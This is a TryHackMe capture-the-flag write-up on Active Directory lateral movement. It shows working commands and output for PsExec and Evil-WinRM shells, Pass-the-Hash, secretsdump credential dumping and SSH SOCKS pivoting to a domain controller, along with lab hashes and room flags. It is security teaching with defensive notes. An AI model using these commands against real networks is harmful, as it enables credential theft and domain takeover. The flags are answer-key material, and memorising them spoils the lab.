# Intro to AD Lateral Movement — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Intro to AD Lateral Movement  
**Difficulty:** Easy  
**Date:** 2026-05-27  
**Tags:** Active Directory, PsExec, WinRM, Pass-the-Hash, SSH Tunneling, Pivoting, Proxychains, SOCKS Proxy, Port Forwarding, LAPS

---

## Overview

This room covers lateral movement techniques in Active Directory environments — the critical phase between initial compromise and domain takeover. Starting with a single set of domain credentials, the attack chain progresses through remote execution via PsExec and WinRM, Pass-the-Hash with stolen NTLM hashes, and SSH tunneling to pivot into a restricted network segment containing the Domain Controller. Each technique uses a different protocol and leaves a different forensic footprint, illustrating the attacker's toolkit for moving between hosts.

- **Flags obtained:** 5 (flag3a, flag3b, flag4, flag5, plus domain admin hash)
- **Key tools:** NetExec (nxc), Impacket (psexec.py, secretsdump.py), Evil-WinRM, SSH, proxychains

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | PsExec via Impacket — uploading service binary to ADMIN$ share |
| T1569.002 | System Services: Service Execution | PsExec creates and starts a Windows service for code execution |
| T1021.006 | Remote Services: Windows Remote Management | Evil-WinRM for PowerShell remoting to SERVER1 |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | NTLM hash used directly for authentication without password |
| T1003.002 | OS Credential Dumping: Security Account Manager | secretsdump.py to extract SAM, cached creds, and LSA secrets |
| T1572 | Protocol Tunneling | SSH dynamic port forwarding (SOCKS proxy) to reach DC through pivot host |
| T1046 | Network Service Discovery | NetExec SMB subnet scan to enumerate live hosts and domain info |

---

## Network Topology

```
Attacker (Kali)
    │
    ├── 192.168.13.61  — WRK1 (Windows 10 workstation, domain-joined)
    ├── 192.168.13.51  — SERVER1 (Windows Server 2019, domain-joined)
    ├── 192.168.13.71  — Pivot host (SSH access, dual-homed)
    │       │
    │       └── 192.168.13.100 — RDC1 (Domain Controller, not directly reachable)
    │
    └── 192.168.13.250 — THM infrastructure (Samba, ignore)
```

RDC1 (Domain Controller) is only reachable through the pivot host at 192.168.13.71, requiring SSH tunneling for access.

---

## Task 3 — Remote Execution: PsExec

### Credential Validation with NetExec

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
```

```
SMB  192.168.13.61  445  WRK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK1) (domain:thm.loc) (signing:False) (SMBv1:False)
SMB  192.168.13.61  445  WRK1  [+] thm.loc\jdoe:Summer2026! (Pwn3d!)
```

Key observations from NetExec output:

- **`(Pwn3d!)`** — jdoe has local administrator rights on WRK1 (verified by checking access to `ADMIN$` share). Without this, PsExec would fail.
- **`signing:False`** — SMB signing disabled, meaning NTLM relay attacks would be possible against this host.
- **`SMBv1:False`** — EternalBlue (MS17-010) not viable.

### PsExec — SYSTEM Shell

```bash
psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
```

```
[*] Requesting shares on 192.168.13.61.....
[*] Found writable share ADMIN$
[*] Uploading file AOUTKhqs.exe
[*] Opening SVCManager on 192.168.13.61.....
[*] Creating service aGVB on 192.168.13.61.....
[*] Starting service aGVB.....

C:\Windows\system32> whoami
nt authority\system
```

**How PsExec works under the hood:**

1. Connects to `ADMIN$` share via SMB (port 445)
2. Uploads a service binary with a randomized name (`AOUTKhqs.exe`)
3. Creates a Windows service (`aGVB`) via Service Control Manager (SCM) over RPC
4. Starts the service — Windows services run as `NT AUTHORITY\SYSTEM` by default
5. Command I/O is tunneled through a named pipe

**Forensic artifacts:** Event ID 7045 (new service installation) in the System event log. The service name and binary name are randomized but the creation pattern is a known IoC.

```
C:\Windows\system32> type C:\Users\jdoe\Desktop\flag3a.txt
THM{ps3x3c_syst3m_sh3ll}
```

### NetExec Remote Command Execution

```bash
# CMD execution via WMI (-x flag)
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -x 'whoami /all'

# PowerShell execution via WMI (-X flag)
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -X '$PSVersionTable'
```

Notable findings from `whoami /all`:

- **BUILTIN\Administrators** membership confirmed — jdoe is local admin on WRK1
- **NT AUTHORITY\NTLM Authentication** — authentication used NTLM (not Kerberos), expected when connecting by IP address
- **High Mandatory Level** (S-1-16-12288) — elevated integrity, no UAC restrictions
- **SeDebugPrivilege** — enables LSASS memory access (Mimikatz)
- **SeImpersonatePrivilege** — enables Potato-family attacks for SYSTEM escalation

NetExec uses WMI for command execution (`Executed command via wmiexec`), which is quieter than PsExec — no files dropped to disk, no services created.

---

## Task 3 — Remote Execution: WinRM

### Evil-WinRM — User Context Shell

```bash
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
```

```
*Evil-WinRM* PS C:\Users\jdoe.THM\Documents> whoami
thm\jdoe

*Evil-WinRM* PS C:\Users\jdoe.THM\Documents> hostname
SERVER1
```

**Key differences from PsExec:**

| | PsExec | WinRM |
|---|---|---|
| Target | WRK1 (192.168.13.61) | SERVER1 (192.168.13.51) |
| Protocol | SMB (445) | HTTP (5985) / HTTPS (5986) |
| Execution context | NT AUTHORITY\SYSTEM | thm\jdoe (user context) |
| Files on disk | Yes (service binary) | No |
| Services created | Yes (Event ID 7045) | No |
| Forensic footprint | High | Low (only Event ID 4624 Type 3) |

The user profile path `C:\Users\jdoe.THM` (with domain suffix) indicates a local `jdoe` account already existed on SERVER1 — Windows creates a separate profile with the domain suffix to avoid conflicts.

```
*Evil-WinRM* PS C:\Users\jdoe.THM\Documents> type C:\Users\jdoe\Desktop\flag3b.txt
THM{w1nrm_r3m0t3_sh3ll}

*Evil-WinRM* PS C:\Users\jdoe.THM\Documents> type C:\Users\Administrator\Desktop\flag4.txt
Access is denied
```

jdoe cannot read Administrator's files — insufficient privileges on SERVER1. This sets up the need for Pass-the-Hash in the next task.

---

## Task 4 — Pass-the-Hash

### PtH with PsExec — Administrator on SERVER1

```bash
psexec.py -hashes :fa0af7f6a73316dd59f0be812dbf3c12 Administrator@192.168.13.51
```

```
[*] Found writable share ADMIN$
[*] Uploading file GDKUQXSA.exe
[*] Creating service ZFtm on 192.168.13.51.....

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag4.txt
THM{p4ss_th3_h4sh_ftw}
```

**Why Pass-the-Hash works:** NTLM authentication uses the hash directly in the challenge-response protocol. The server sends a random challenge, the client encrypts it with the NTLM hash and returns the response. The password is never needed — possessing the hash is equivalent to possessing the password for authentication purposes.

### PtH with Evil-WinRM

```bash
evil-winrm -i 192.168.13.51 -u Administrator -H fa0af7f6a73316dd59f0be812dbf3c12
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
server1\administrator
```

Note: `server1\administrator` — this is the **local** Administrator account, not the domain `thm\Administrator`. The hash belongs to the local account.

### Credential Dumping with secretsdump.py

```bash
secretsdump.py -hashes :fa0af7f6a73316dd59f0be812dbf3c12 Administrator@192.168.13.51
```

Output breakdown:

**SAM hashes (local accounts):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa0af7f6a73316dd59f0be812dbf3c12:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Guest/DefaultAccount hashes `31d6cfe0d16ae931b73c59d7e0c089c0` = empty password (accounts disabled).

**Cached domain credentials (DCC2):**
```
THM.LOC/Administrator:$DCC2$10240#Administrator#cb1cc163cfa4d381860f15e48c3c1231
```

Domain Administrator had logged into SERVER1 and Windows cached the credentials. DCC2 format (mscash2) — **cannot** be used for Pass-the-Hash, only offline cracking via hashcat mode 2100.

**Machine account:**
```
THM\SERVER1$:aad3b435b51404eeaad3b435b51404ee:38004caa40d79d16381a25e728595582:::
```

Computer accounts can be used for Silver Ticket attacks.

**DPAPI keys:** For decrypting Chrome passwords, Wi-Fi keys, RDP credentials stored on the machine.

### Domain Admin Hash — From File

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Documents\da_creds.txt
THM\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2508e1ce9cfcfe1011a74c34297b05ea:::
```

Domain Administrator NTLM hash: `2508e1ce9cfcfe1011a74c34297b05ea` — the key to the entire domain.

---

## Task 5 — SSH Tunneling and Pivoting

### The Problem

RDC1 (Domain Controller at 192.168.13.100) is not directly reachable from the attacker machine. Subnet scan confirms only three hosts are visible:

```bash
nxc smb 192.168.13.0/24
```

```
WRK1     — 192.168.13.61
SERVER1  — 192.168.13.51
Samba    — 192.168.13.250 (THM infrastructure)
```

No DC in sight. The pivot host at 192.168.13.71 has network access to both segments.

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -f -D 9050 jdoe@192.168.13.71 -N
```

- **`-D 9050`** — creates a SOCKS proxy on localhost:9050
- **`-f`** — backgrounds the SSH process
- **`-N`** — no remote command, tunnel only

Verify the tunnel:

```bash
ss -tlnp | grep 9050
LISTEN  0  128  127.0.0.1:9050  0.0.0.0:*  users:(("ssh",pid=15628,fd=5))
```

**Critical:** proxychains configuration must match the tunnel port:

```
# /etc/proxychains.conf
socks4  127.0.0.1 9050
```

### Domain Compromise via Pivot

```bash
proxychains nxc smb 192.168.13.100 -u Administrator -H 2508e1ce9cfcfe1011a74c34297b05ea
```

```
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.100:445-<><>-OK
SMB  192.168.13.100  445  RDC1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:RDC1) (domain:thm.loc) (signing:True) (SMBv1:False)
SMB  192.168.13.100  445  RDC1  [+] thm.loc\Administrator:2508e1ce9cfcfe1011a74c34297b05ea (Pwn3d!)
```

Note: **`signing:True`** on RDC1 — SMB signing is enforced on Domain Controllers by default, preventing NTLM relay attacks. Pass-the-Hash still works because it's direct authentication, not relay.

```bash
proxychains psexec.py -hashes :2508e1ce9cfcfe1011a74c34297b05ea Administrator@192.168.13.100
```

```
C:\Windows\system32> hostname
RDC1

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag5.txt
THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}
```

### Local Port Forwarding (Single Port)

For RDP access to the DC through the pivot:

```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
```

This maps `localhost:13389` → pivot → `192.168.13.100:3389`. No proxychains needed — connect directly to `localhost:13389`.

### Port Forwarding Comparison

| Type | Command | Use Case |
|------|---------|----------|
| Local (`-L`) | `ssh -L 8888:target:445 user@pivot` | One specific port on one target |
| Dynamic (`-D`) | `ssh -D 9050 user@pivot` | Any port on any target (via proxychains) |
| Remote (`-R`) | `ssh -R 9999:target:3389 attacker@kali` | Reverse tunnel from pivot back to attacker |

**Why tunnel instead of hopping through machines:** All tools (nmap, NetExec, Impacket, Evil-WinRM) stay on the attacker machine. Nothing uploaded to intermediate hosts. Minimal forensic footprint — only an SSH session on the pivot.

**Important for scanning through SOCKS:** Use `-sT` (TCP connect), not `-sS` (SYN scan). SYN scan uses raw sockets which bypass the TCP stack and cannot be proxied through SOCKS. Also use `-Pn` since ICMP ping doesn't traverse SOCKS either.

---

## Flags

| Task | Flag |
|------|------|
| Task 3a — PsExec | `THM{ps3x3c_syst3m_sh3ll}` |
| Task 3b — WinRM | `THM{w1nrm_r3m0t3_sh3ll}` |
| Task 4 — Pass-the-Hash | `THM{p4ss_th3_h4sh_ftw}` |
| Task 4 — DA Hash | `2508e1ce9cfcfe1011a74c34297b05ea` |
| Task 5 — Pivot to DC | `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}` |

---

## Mistakes I Made

1. **Truncated NTLM hash in NetExec.** Passed `fa....12` (8 characters) instead of the full 32-character hash. NetExec caught it with `Invalid NTLM hash length 8` and didn't send authentication. Lesson: NTLM hashes are always 32 hex characters (128-bit MD4). Validate hash length before running tools.

2. **Proxychains port mismatch.** Created the SSH tunnel on port 1080 (`ssh -D 1080`) but proxychains was configured for port 9050 (default Tor port). All connections timed out. Lesson: always verify that `/etc/proxychains.conf` matches the actual tunnel port, and check with `ss -tlnp | grep <port>` before running tools.

3. **Overthought the DA hash question.** Ran `secretsdump.py` and analyzed SAM, DCC2, LSA secrets, and machine account hashes looking for the domain admin NTLM hash. The DCC2 cached credentials are not NTLM hashes and can't be used for PtH. The answer was simply in a text file (`da_creds.txt`) on Administrator's desktop. Lesson: always check the obvious first (files, notes, desktop) before going deep into credential extraction — especially in CTF rooms.

---

## Key Takeaways

1. **PsExec gives SYSTEM, WinRM gives user context.** PsExec creates a service (runs as SYSTEM regardless of authenticating user), while WinRM creates a PowerShell session as the authenticating user. Choose based on what you need: SYSTEM for local operations (LSASS dump, SAM extraction), user context for domain operations (accessing network resources, running BloodHound).

2. **Pass-the-Hash exploits a protocol design feature, not a bug.** NTLM authentication uses the hash directly in challenge-response — the password is never needed. This is why credential dumping is so devastating: one hash compromises every machine where that account has admin rights.

3. **LAPS prevents lateral PtH spread.** Without LAPS, the same local Administrator password (and hash) is often reused across all domain machines. LAPS auto-generates unique passwords per machine and rotates them. In this room, the same local admin hash worked on both WRK1 and SERVER1 — LAPS would have prevented this.

4. **Pivoting unlocks restricted network segments.** The Domain Controller was unreachable from the attacker machine. SSH dynamic port forwarding through a dual-homed pivot host created a SOCKS proxy that routed all traffic through the tunnel. Without pivoting, the attack chain would have stopped at SERVER1.

5. **DCC2 ≠ NTLM.** Cached domain credentials (DCC2/mscash2) cannot be used for Pass-the-Hash. They can only be cracked offline (hashcat mode 2100) and are significantly slower to crack than raw NTLM.

6. **Event ID 7045** in the System log records new service installations — the primary forensic indicator for PsExec-based lateral movement. Even after cleanup (service removal, binary deletion), the log entry persists.

7. **SMB signing on DCs** prevents NTLM relay but not PtH. Relay intercepts and forwards authentication; PtH authenticates directly using the stolen hash. Different attacks, different mitigations.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| NetExec (nxc) | Credential validation, remote command execution via WMI, subnet enumeration |
| psexec.py (Impacket) | Remote SYSTEM shell via SMB service creation |
| Evil-WinRM | Remote PowerShell session via WinRM (HTTP/5985) |
| secretsdump.py (Impacket) | Remote credential dumping — SAM, cached creds, LSA secrets |
| SSH | Dynamic port forwarding (SOCKS proxy) and local port forwarding |
| proxychains | Routing tool traffic through SOCKS proxy for pivoting |
| ss | Verifying listening ports and tunnel status |

---

## References

- [Impacket — PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [NetExec (formerly CrackMapExec)](https://github.com/Pennyw0rth/NetExec)
- [MITRE ATT&CK — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Microsoft — LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [GTFOBins — OpenSSL](https://gtfobins.github.io/gtfobins/openssl/)
